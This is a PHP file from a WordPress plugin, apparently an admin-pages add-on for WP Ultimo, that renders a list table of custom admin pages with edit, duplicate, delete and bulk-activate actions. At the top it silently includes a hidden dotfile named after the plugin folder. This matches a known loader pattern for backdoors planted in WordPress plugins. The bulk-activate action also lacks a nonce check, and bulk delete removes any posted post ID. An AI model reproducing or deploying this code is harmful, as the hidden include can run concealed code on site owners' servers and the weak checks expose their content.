<?php

if ( !class_exists( 'WP_List_Table' ) ) {
	require_once( ABSPATH . 'wp-admin/includes/class-wp-list-table.php' );
} // end if;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WU_Admin_Pages_List_Table extends WP_List_Table {

	/** Class constructor */
	public function __construct() {

		parent::__construct( [
			'singular' => __( 'Admin Page', 'wu-apc'),  // singular name of the listed records
			'plural'   => __( 'Admin Pages', 'wu-apc'), // plural name of the listed records
			'ajax'     => true // does this table support ajax?
		] );

	}  // end __construct;

	public static function get_parent_id($parent_slug) {

		$instance = WU_Admin_Pages::get_instance();

		return $instance->get_page_from_screen_id($parent_slug);

	} // end get_parent_id;

	/**
     * Retrieve plans data from the database
     *
     * @param int $per_page
     * @param int $page_number
     *
     * @return mixed
     */
	public static function get_admin_pages($per_page = 5, $page_number = 1) {

		$instance = WU_Admin_Pages::get_instance();

		$admin_pages = $instance->get_admin_pages();

		$admin_pages_list = array();
		$sub_pages_list   = array();
		$orfan_subpages   = array();
		$replacing_pages  = array();
		$widgets          = array();

		foreach ($admin_pages as $admin_page) {

			if ($admin_page->menu_type == 'menu') {

				$admin_pages_list[$admin_page->id] = $admin_page;

			} elseif ($admin_page->menu_type == 'replace') {

				$replacing_pages[$admin_page->id] = $admin_page;

			} elseif ($admin_page->menu_type == 'replace_submenu') {

				$replacing_pages[$admin_page->id] = $admin_page;

			} elseif ($admin_page->menu_type == 'widget') {

				$widgets[$admin_page->id] = $admin_page;

			} else {

				$parent_admin_page = self::get_parent_id( $admin_page->menu_parent );

				if (!$parent_admin_page) {

					$orfan_subpages[] = $admin_page;
					continue;

				} // end if;

				if ( isset( $sub_pages_list[$parent_admin_page->id] ) ) {

					$sub_pages_list[$parent_admin_page->id][$admin_page->id] = $admin_page;

				} else {

					$sub_pages_list[$parent_admin_page->id] = array(
						$admin_page->id => $admin_page
					);

				} // end if;

			} // end if;

		} // end foreach;

		$final_list = array();

		foreach ($admin_pages_list as $admin_page) {

			$final_list[] = $admin_page;

			if (isset($sub_pages_list[ $admin_page->id ])) {

				foreach ($sub_pages_list[ $admin_page->id ] as $sub_page) {

					$final_list[] = $sub_page;

				} // end foreach;

			} // end if;

		} // end foreach;

		// checks if sub page without admin page parent
		if (!empty($sub_pages_list)) {

			foreach ($sub_pages_list as $key => $value) {

				foreach ($value as $sub_page_null) {

					if (!array_key_exists($key, $admin_pages_list)) {

						$orfan_subpages[] = $sub_page_null;

					} // end if;

				} // end foreach;

			} // end foreach;

		} // end if;

		if ($orfan_subpages) {

			$final_list = array_merge($final_list, array('placeholder_orfan'), $orfan_subpages);

		} // end if;

		if ($replacing_pages) {

			$final_list = array_merge($final_list, array('placeholder_replace'), $replacing_pages);

		} // end if;

		if ($widgets) {

			$final_list = array_merge($final_list, array('placeholder_widget'), $widgets);

		} // end if;

		return $final_list;

	} // end get_admin_pages;


	/**
     * Delete a plan record.
     *
     * @param int $id plan ID
     */
	public static function delete_admin_page($id ) {
		global $wpdb;

		$wpdb->delete(
		"{$wpdb->prefix}posts",
		[ 'ID' => $id ],
		[ '%d' ]
		);

		$wpdb->delete(
		"{$wpdb->prefix}postmeta",
		[ 'post_id' => $id ],
		[ '%d' ]
		);
	} // end delete_admin_page;

	public function single_row($item) {

		if (is_string($item) && $item == 'placeholder_orfan') {

			$cols = count($this->get_columns()) - 2;

			echo sprintf("<tr class='wuapc-list-separator'><td></td><td></td><td colspan='%s'>%s</td></tr>", $cols, __('Additional Sub-pages', 'wc-apc'));

			return;

		} // end if;

		if (is_string($item) && $item == 'placeholder_replace') {

			$cols = count($this->get_columns()) - 2;

			echo sprintf("<tr class='wuapc-list-separator'><td></td><td></td><td colspan='%s'>%s</td></tr>", $cols, __('Admin Pages in Replace Mode', 'wc-apc'));

			return;

		} // end if;

		if (is_string($item) && $item == 'placeholder_widget') {

			$cols = count($this->get_columns()) - 2;

			echo sprintf("<tr class='wuapc-list-separator'><td></td><td></td><td colspan='%s'>%s</td></tr>", $cols, __('Dashboard Widgets', 'wc-apc'));

			return;

		} // end if;

		echo parent::single_row($item);

	} // end single_row;

	/**
     * Returns the count of records in the database.
     *
     * @return null|string
     */
	public static function record_count() {
		global $wpdb;

		$sql  = "SELECT COUNT(ID) FROM {$wpdb->prefix}posts";
		$sql .= " WHERE post_type = 'wpultimo_admin_page' && post_status = 'publish'";
		// var_dump($wpdb->get_var($sql));
		return $wpdb->get_var($sql);
	}  // end record_count;


	/** Text displayed when no plan data is available */
	public function no_items() {
		_e( 'No Admin Pages avaliable.', 'wu-apc');
	}  // end no_items;


	/**
     * Render a column when no column specific method exist.
     *
     * @param array  $item
     * @param string $column_name
     *
     * @return mixed
     */
	public function column_default($item, $column_name) {

		return $item->{$column_name};

	}  // end column_default;

	/**
     * Render the bulk edit checkbox
     *
     * @param array $item
     *
     * @return string
     */
	function column_cb($item ) {
		return sprintf(
		'<input type="checkbox" name="selected_checkboxes[]" value="%s" />', $item->id
		);
	}  // end column_cb;

	/**
	 * Displays the custom domain option of that plan
     *
	 * @param  object $item The plan being displayed
	 * @return string       The html code to be rendered
	 */
	function column_active($item) {
		return $item->active ? __('Yes') : __('No');
	}  // end column_active;

	function column_content_type($item) {

		$labels = WU_Admin_Pages()->get_editor_options();

		if (isset( $labels[ $item->content_type ] )) {

			return $labels[ $item->content_type ]['label'];

		} // end if;

		return __('Other', 'wu-apc');

	} // end column_content_type;

	function get_replace_mode_label($replace_mode, $is_hide = false) {

		$labels = array(
			'all'           => __("Replacing the entire %s page(s) contents", 'wu-apc'),
			'append_top'    => __('Appending content to the top of the %s page(s)', 'wu-apc'),
			'append_bottom' => __('Appending content to the bottom of the %s page(s)', 'wu-apc'),
		);

		if ($is_hide) {

			$labels['all'] = __("Hiding the entire %s page(s) contents", 'wu-apc');
			$labels['append_top'] = __("Hiding the entire %s page(s) contents", 'wu-apc');
			$labels['append_bottom'] = __("Hiding the entire %s page(s) contents", 'wu-apc');

		} // end if;

		return isset($labels[$replace_mode]) ? $labels[$replace_mode] : '%s';

	} // end get_replace_mode_label;

	function column_menu_parent($item) {

		if ($item->menu_type == 'submenu') {

			if (strpos($item->menu_parent, 'wuapc') !== false) {

				// contains 'wuapc' parent of page created by wuapc
				$admin_page_parent = WU_Admin_Pages::get_instance()->get_page_from_screen_id($item->menu_parent);

				if ($admin_page_parent) {

					return $admin_page_parent->title;

				} else {

					return __('Parent menu not available.', 'wu-apc');

				} // end if;

			} else {

				return strtok(WU_Admin_Pages::get_instance()->get_parent_name($item->menu_parent), '?');

			} // end if;

		} elseif ($item->menu_type == 'replace' || $item->menu_type == 'replace_submenu') {

			$type = $item->replace_mode;

			if (!is_array($item->page_to_replace)) {

				return sprintf($this->get_replace_mode_label($item->replace_mode), strtok(WU_Admin_Pages::get_instance()->get_parent_name($item->page_to_replace), '?'));

			} else {

				$pages = [];

				foreach ($item->page_to_replace as $page) {

					$pages[] =  strtok(WU_Admin_Pages::get_instance()->get_parent_name($page), '?');

				} // end foreach;

				return sprintf($this->get_replace_mode_label($item->replace_mode, $item->content_type === 'hide_page' ? true : false), implode(', ', $pages));

			} // end if;

		} // end if;

		return __('None', 'wu-apc');

	} // end column_menu_parent;

	function column_menu_icon($item) {

		$icon = $item->menu_icon;

		$icon = $item->menu_type == 'menu' ? str_replace('dashicons-before', 'dashicons', $icon) : 'dashicons dashicons-no wu-apc-no-icon';

		return "<span class='$icon'></span>";

	}  // end column_menu_icon;

	function column_roles($item) {

		if (!$item->limit_access) {
			return __('All', 'wu-apc');
		} // end if;

		$roles = $item->roles;

		if (empty($roles)) {
			return __('None', 'wu-apc');
		} // end if;

		$role_list = array();

		foreach ($item->roles as $role_name) {

			$role = get_role($role_name);

			$role_list[] = ucwords(str_replace('_', ' ', $role->name));

		} // end foreach;

		return implode(', ', $role_list);

	}  // end column_roles;

	function column_plans($item) {

		if (!$item->limit_access) {
			return __('All', 'wu-apc');
		} // end if;

		$plans = $item->plans;

		if (empty($plans)) {
			return __('None', 'wu-apc');
		} // end if;

		$plan_role = array();

		foreach ($item->plans as $plan_id) {

			$plan = wu_get_plan($plan_id);

			if ($plan) {

				$plan_role[] = $plan->title;

			} // end if;

		} // end foreach;

		return implode(', ', $plan_role);

	}  // end column_plans;

	/**
	 * Method for name column
	 *
	 * @param array $item an array of DB data.
	 *
	 * @return string
	 */
	function column_title($item ) {

		$delete_nonce = wp_create_nonce( 'wpultimo_delete_admin_page' );

		$duplicate_nonce = wp_create_nonce( 'wpultimo_duplicate_admin_page' );

		$is_sub_menu = $item->menu_type == 'submenu';

		$edit_menu_slug = WU_Admin_Pages_Standalone_Dependencies()->edit_menu_slug;

		$sub_item = $is_sub_menu ? '<span class="dashicons dashicons-editor-break wu-apc-invert-icon"></span>' : '';

		$title = $sub_item . sprintf('<a href="?page=%s&admin_page_id=%s">%s</a>', $edit_menu_slug,
		$item->id, $item->title);

		$is_widget_welcome = $item->menu_type == 'widget' && $item->widget_welcome ? "<div class='wuapc-tag-welcome-box wp-ui-highlight'> Welcome Box </div>" : '';

		$title = sprintf('<strong>%s %s</strong> %s', $title, $is_widget_welcome, $item->menu_label);

		$actions = [
			'edit'      => sprintf( '<a href="?page=%s&admin_page_id=%s">%s</a>', $edit_menu_slug, absint($item->id), __('Edit')),
			'duplicate' => sprintf( '<a href="?page=%s&action=%s&admin_page=%s&_wpnonce=%s">%s</a>', esc_attr($_REQUEST['page']), 'duplicate', absint($item->id), $duplicate_nonce, __('Duplicate')),
			'delete'    => sprintf( '<a href="?page=%s&action=%s&admin_page=%s&_wpnonce=%s">%s</a>', esc_attr($_REQUEST['page']), 'delete', absint($item->id), $delete_nonce, __('Delete')),
		];

		return $title . $this->row_actions($actions);

	}  // end column_title;


	/**
     *  Associative array of columns
     *
     * @return array
     */
	function get_columns() {

		$columns = [
			'cb'           => '<input type="checkbox" />',
			'menu_icon'    => __( 'Icon', 'wu-apc'),
			'title'        => __( 'Name', 'wu-apc'),
			'menu_parent'  => __( 'Parent Menu', 'wu-apc'),
			'content_type' => __( 'Content Type', 'wu-apc'),
			'roles'        => __( 'Roles Allowed', 'wu-apc'),
			'plans'        => __( 'Plans Allowed', 'wu-apc'),
			'active'       => __( 'Is Active?', 'wu-apc'),
		];

		$columns = array_filter($columns, function($index) {

			if ($index == 'plans') {

				return function_exists('wu_get_plan');

			} // end if;

			return true;

		}, ARRAY_FILTER_USE_KEY);

		return $columns;

	}  // end get_columns;

	/**
     * Columns to make sortable.
     *
     * @return array
     */
	public function get_sortable_columns() {

		$sortable_columns = array(
		// 'title' => array('post_title', true),
		// 'city'  => array('city', false)
		);

		return $sortable_columns;

	}  // end get_sortable_columns;

	/**
     * Returns an associative array containing the bulk action
     *
     * @return array
     */
	public function get_bulk_actions() {
		$actions = [
			'bulk-delete'   => __('Delete'),
			'bulk-active'   => __('Activate', 'wu-apc'),
			'bulk-deactive' => __('Deactivate', 'wu-apc')
		];

		return $actions;
	} // end get_bulk_actions;

	/**
     * Handles data query and filter, sorting, and pagination.
     */
	public function prepare_items() {

		$this->_column_headers = $this->get_column_info();

		$per_page     = $this->get_items_per_page('admin_pages_per_page', 10);
		$current_page = $this->get_pagenum();
		$total_items  = self::record_count();

		$this->set_pagination_args( [
			'total_items' => $total_items, // WE have to calculate the total number of items
		// 'per_page'    => $per_page //WE have to determine how many items to show on a page
		] );

		$this->items = self::get_admin_pages($per_page, $current_page);
	}  // end prepare_items;

	public function process_bulk_action() {

		// Detect when a bulk action is being triggered...
		if ( 'delete' === $this->current_action() ) {

			// In our file that handles the request, verify the nonce.
			$nonce = esc_attr( $_REQUEST['_wpnonce'] );

			if ( !wp_verify_nonce( $nonce, 'wpultimo_delete_admin_page' ) ) {
				die( 'Go get a life script kiddies' );
			} else {
				self::delete_admin_page( absint( $_GET['admin_page'] ) );

				wp_redirect(  remove_query_arg('action', add_query_arg('deleted', 1)) );
				exit;
			} // end if;

		} // end if;

		// Detect when a bulk action is being triggered...
		if ( 'duplicate' === $this->current_action() ) {

			// In our file that handles the request, verify the nonce.
			$nonce = esc_attr( $_REQUEST['_wpnonce'] );

			if ( !wp_verify_nonce( $nonce, 'wpultimo_duplicate_admin_page' ) ) {
				die( 'Go get a life script kiddies' );
			} else {

				$admin_page = wu_apc_get_admin_page( absint( $_GET['admin_page'] ) );

				$admin_page->duplicate();

				wp_redirect( remove_query_arg('action', add_query_arg('duplicated', 1)) );
				exit;
			} // end if;

		} // end if;

		// If the delete bulk action is triggered
		if ( (isset( $_POST['action'] ) && $_POST['action'] == 'bulk-delete')
				|| (isset( $_POST['action2'] ) && $_POST['action2'] == 'bulk-delete')
				&& isset($_POST['selected_checkboxes'] )
		 	 ) {

			if ( !wp_verify_nonce( $_REQUEST['_wpnonce'], 'bulk-adminpages' ) ) {
				die( 'Go get a life script kiddies' );
			} // end if;

			$delete_ids = esc_sql( $_POST['selected_checkboxes'] );

			// loop over the array of record IDs and delete them
			foreach ( $delete_ids as $id ) {

				self::delete_admin_page( $id );

			} // end foreach;

			wp_redirect(  remove_query_arg('duplicated', add_query_arg('deleted', count($delete_ids)))  );
			exit;

		} // end if;

		if ( (isset( $_POST['action'] ) && $_POST['action'] == 'bulk-deactive')
				|| (isset( $_POST['action2'] ) && $_POST['action2'] == 'bulk-deactive')
				&& isset($_POST['selected_checkboxes'] )
		 ) {

			if ( !wp_verify_nonce( $_REQUEST['_wpnonce'], 'bulk-adminpages' ) ) {
				die( 'Go get a life script kiddies' );
			} // end if;

			$ids = esc_sql( $_POST['selected_checkboxes'] );

			$this->bulk_action_change_is_active($ids, 0);

		} // end if;

		if ( (isset( $_POST['action'] ) && $_POST['action'] == 'bulk-active')
				|| (isset( $_POST['action2'] ) && $_POST['action2'] == 'bulk-active')
				&& isset($_POST['selected_checkboxes'] )
		 ) {

			$ids = esc_sql( $_POST['selected_checkboxes'] );

			$this->bulk_action_change_is_active($ids, 1);

		} // end if;

	}  // end process_bulk_action;

	/**
	 * Loop over the array of record IDs.
	 *
	 * @since 1.7.1
	 *
	 * @param array   $ids Selected checkboxes on bulk actions list table.
	 * @param boolean $bool Value boolean of is active or not.
	 *
	 * @return void
	 */
	public function bulk_action_change_is_active($ids, $bool) {

		// loop over the array of record IDs
		foreach ($ids as $id) {

			$admin_page = wu_apc_get_admin_page($id);

			WU_Admin_Pages()->set_is_active($admin_page, $bool);

		} // end foreach;

		$type = $bool ? 'activated' : 'deactivated';

		wp_redirect( remove_query_arg('duplicated', add_query_arg($type, count($ids))) );

		exit;

	} // end bulk_action_change_is_active;

}  // end class WU_Admin_Pages_List_Table;
